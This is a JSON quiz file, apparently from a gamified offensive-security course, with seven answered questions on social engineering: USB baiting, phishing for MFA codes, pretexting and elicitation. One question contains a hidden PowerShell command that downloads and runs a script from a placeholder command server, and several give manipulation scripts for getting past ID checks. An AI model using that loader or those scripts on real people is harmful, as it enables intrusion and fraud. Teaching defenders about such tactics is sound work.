@@ -1,0 +1,94 @@
+{
+    "id": "sq_offensive_security_social_engineering_3",
+    "title": "Bait & Switch Predictions",
+    "triggerChapterIndex": 8,
+    "metadata": {
+        "type": "prediction"
+    },
+    "questions": [
+        {
+            "id": "sq_offsec_se_3_q1",
+            "type": "code_output",
+            "question": "You drop a USB drive labeled 'Salary_Adjustments_Q3.xlsm' in the finance department parking lot. An employee finds it and plugs it into their work computer. What is the most likely immediate outcome?",
+            "codeSnippet": "Employee finds USB drive.\nEmployee plugs USB into corporate laptop.\nExcel opens with blurred image and 'Enable Macros to view content'.\nEmployee clicks 'Enable Content'.",
+            "correctOutput": "Malicious macro executes, establishing a reverse shell or downloading a second-stage payload to the corporate network.",
+            "correctAnswer": "Malicious macro executes, establishing a reverse shell or downloading a second-stage payload to the corporate network.",
+            "options": [],
+            "explanation": "The combination of curiosity (salary data) and social engineering (blurred image lure) leads to macro enablement, resulting in code execution.",
+            "xpReward": 25,
+            "difficulty": 2
+        },
+        {
+            "id": "sq_offsec_se_3_q2",
+            "type": "code_output",
+            "question": "An attacker calls an employee and says: 'Hi, this is Alex from IT. We're pushing an urgent security patch. I just need you to read me the code from your Duo app.' The employee responds: 'I'm not comfortable with that. Can you email me the ticket number?' What is the most effective response for the attacker?",
+            "codeSnippet": "Attacker: 'Sure, it's ticket #554321. I'll email you from the help desk account. You can call the main line if you prefer.'\n(Attacker provides a plausible but inconvenient alternative path.)",
+            "correctOutput": "The employee, wanting to avoid hassle, says 'No, it's fine. The code is 8-3-2-1-9-4.' The attacker gains the MFA token.",
+            "correctAnswer": "The employee, wanting to avoid hassle, says 'No, it's fine. The code is 8-3-2-1-9-4.' The attacker gains the MFA token.",
+            "options": [],
+            "explanation": "This is an application of 'reverse psychology' and 'providing an inconvenient alternative.' The target takes the path of least resistance.",
+            "xpReward": 25,
+            "difficulty": 2
+        },
+        {
+            "id": "sq_offsec_se_3_q3",
+            "type": "code_output",
+            "question": "During a deep cover engagement, you are pretending to be a third-party security auditor. The target asks: 'I'd like to verify your credentials. Can you give me your company's business license number?' What is the predicted outcome if you respond with: 'I'd have to get that from legal. Let me circle back with you next week on that.'",
+            "codeSnippet": "Attacker: 'I'd have to get that from legal. Let me circle back with you next week on that.'",
+            "correctOutput": "The target may accept the delay, but suspicion is raised. The attacker should gracefully exit the engagement soon after, as active verification increases risk of exposure.",
+            "correctAnswer": "The target may accept the delay, but suspicion is raised. The attacker should gracefully exit the engagement soon after, as active verification increases risk of exposure.",
+            "options": [],
+            "explanation": "A delay buys time but does not eliminate the request. The deep cover persona may not withstand active vetting; a planned exit is prudent.",
+            "xpReward": 25,
+            "difficulty": 3
+        },
+        {
+            "id": "sq_offsec_se_3_q4",
+            "type": "code_output",
+            "question": "A Red Teamer sends a phishing email with a malicious Word document attached. The email subject is 'Invoice #44532 - Action Required.' The user opens the document and sees a blurry invoice with the text 'Enable Macros to view this secure document.' The user clicks 'Enable Content.' Predict the sequence of events that follows.",
+            "codeSnippet": "User opens Invoice_44532.docm.\nUser clicks 'Enable Content'.\nVBA macro executes: Shell 'powershell -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://c2-server/payload.ps1')'",
+            "correctOutput": "PowerShell downloads and executes the payload.ps1 script, which likely establishes a C2 beacon, giving the attacker remote access to the user's workstation.",
+            "correctAnswer": "PowerShell downloads and executes the payload.ps1 script, which likely establishes a C2 beacon, giving the attacker remote access to the user's workstation.",
+            "options": [],
+            "explanation": "This is a classic two-stage maldoc attack. The VBA macro acts as a downloader for the final stage payload.",
+            "xpReward": 25,
+            "difficulty": 2
+        },
+        {
+            "id": "sq_offsec_se_3_q5",
+            "type": "code_output",
+            "question": "You are eliciting information from a target at a networking event. You say: 'I heard from someone that you guys are moving your entire infrastructure to Azure. Is that true?' The target is not authorized to discuss cloud strategy but wants to correct misinformation. Predict the target's most likely response.",
+            "codeSnippet": "Attacker: 'I heard from someone that you guys are moving your entire infrastructure to Azure. Is that true?'",
+            "correctOutput": "The target says: 'No, that's not right. We're staying with AWS for now, just migrating some workloads.' The attacker learns the true cloud provider and migration status.",
+            "correctAnswer": "The target says: 'No, that's not right. We're staying with AWS for now, just migrating some workloads.' The attacker learns the true cloud provider and migration status.",
+            "options": [],
+            "explanation": "This is 'Deliberate False Statement' elicitation. The target's desire to correct the record reveals accurate information.",
+            "xpReward": 25,
+            "difficulty": 2
+        },
+        {
+            "id": "sq_offsec_se_3_q6",
+            "type": "code_output",
+            "question": "A security guard stops you at the lobby. You are carrying a clipboard and wearing a hard hat. You say: 'I'm with the fire marshal's office. Annual extinguisher inspection.' The guard asks for ID. What is the predicted outcome if you respond with: 'Left it in the truck. Look, I've got 40 floors to do today. You want to be the one who explains why the 40th floor didn't get inspected?'",
+            "codeSnippet": "Guard: 'I need to see ID.'\nAttacker: 'Left it in the truck. Look, I've got 40 floors to do today. You want to be the one who explains why the 40th floor didn't get inspected?'",
+            "correctOutput": "The guard, feeling pressured and not wanting to be responsible for a safety violation, waves you through without further verification.",
+            "correctAnswer": "The guard, feeling pressured and not wanting to be responsible for a safety violation, waves you through without further verification.",
+            "options": [],
+            "explanation": "This leverages authority (fire marshal), urgency (40 floors), and fear of negative consequences (uninspected floors) to bypass the ID check.",
+            "xpReward": 25,
+            "difficulty": 2
+        },
+        {
+            "id": "sq_offsec_se_3_q7",
+            "type": "code_output",
+            "question": "You send a LinkedIn message to a target: 'Hi [Name], I'm researching security tools for an article. I noticed your team uses Okta. How do you like it compared to Duo?' The target's company actually uses Duo, not Okta. Predict the target's response.",
+            "codeSnippet": "Attacker: 'I noticed your team uses Okta. How do you like it compared to Duo?'",
+            "correctOutput": "Target: 'Actually, we use Duo, not Okta. It's fine for our needs.' The attacker confirms the MFA vendor.",
+            "correctAnswer": "Target: 'Actually, we use Duo, not Okta. It's fine for our needs.' The attacker confirms the MFA vendor.",
+            "options": [],
+            "explanation": "This is a deliberate false statement designed to trigger a correction, revealing the true MFA solution.",
+            "xpReward": 25,
+            "difficulty": 2
+        }
+    ]
+}
